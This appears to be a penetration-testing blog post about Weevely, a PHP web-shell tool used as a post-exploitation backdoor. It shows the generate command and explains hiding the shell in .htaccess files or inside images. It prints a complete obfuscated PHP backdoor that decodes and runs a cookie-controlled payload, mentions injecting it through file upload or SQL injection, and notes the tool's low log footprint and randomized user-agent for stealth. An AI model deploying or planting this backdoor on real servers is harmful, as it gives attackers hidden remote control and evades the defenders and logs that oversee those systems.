Weevely is a PHP command line web shell usually used as a backdoor while performing the post exploitation phase of a penetration test. 
By default in Kali Linux, the installed version 1.1 isn't supported anymore but version 3 is available on [GitHub](https://github.com/epinna/weevely3 "Weevely on GitHub"){:class="flashlink" target="_blank"}.

Generate the backdoor:

`weevely generate.<mode> <password> <path>`

The password is optionnal but it's important to protect your customer from other users because an unwanted access can easily lead to a full access on the server with privileges escalation. There is three kinds of backdoor available but this functionnality seems to have been removed in version 3.

- **htaccess**: a single `.htaccess` file is created containing the malicious code and the right Apache directive so that all `.htaccess` files are considered as regular PHP script
- **img**: giving an existing image, Weevely will concatenate the binary datas and the malicious code, plus it also creates an `.htaccess` 
to tell Apache that the image should be considered as a regular PHP script (that means both files should be uploaded on the target server)
- **php**: this is the default, a single PHP script is generated

Example:

A `sessions` directory has also been created to log every command. 
No matter what creation mode you choosed the obfuscated generated PHP code looks like this:

~~~php
<?php
$ztqi = str_replace("h","","hshtrh_rhehphlhahche");
$hule="am9pbihhcnJhehrV9zbGhrljZSgkYSwkhrYhrygkYhrSktMykpKShrkpO2VjaG8gJzwvJhry4kay4nhrPic7fQ==";
$xhmv="PSdlcnRhr5JztlY2hvIhrCc8Jy4kay4nPihrc7ZXhrZhbChiYXNlNjRfZGVjbhr2RlKHBhryZWdfchrmVhrwbGFjZ";
$ezko="ShhcnJheSgnL1hrteXHc9XHNdLycsJy9chrcy8nKSwgYXJyYXkohrJyhrcshrJyhrsnKSwg";
$kyjf="JGM9J2NvdW50JzskYT0kX0NPT0tJRTtpZihyZXNldCgkYhrSk9PSdheicgJihrYgJGMoJGEpPjMpeyRr";
$tjbu = $ztqi("g", "", "basgeg6g4g_gdgegcgode");
$plri = $ztqi("y","","cyreyatye_yfuynycytyiyon");
$pigj = $plri('', $tjbu($ztqi("hr", "", $kyjf.$xhmv.$ezko.$hule))); $pigj();
?>
~~~

There is different ways to inject the backdoor on the target server: file upload, SQL injection and so on... 
Once you have infected your target, you can connect to the client with the password you choosed:

Running `:help `will display the list of all modules available or the detailed usage informations of the given module.

Another good point for Weevely is the verbosity, the remote agent is very low footprint. Below my Apache logs after running some commands:

As you may notice the user-agent has also been randomized wich is usually a good idea...
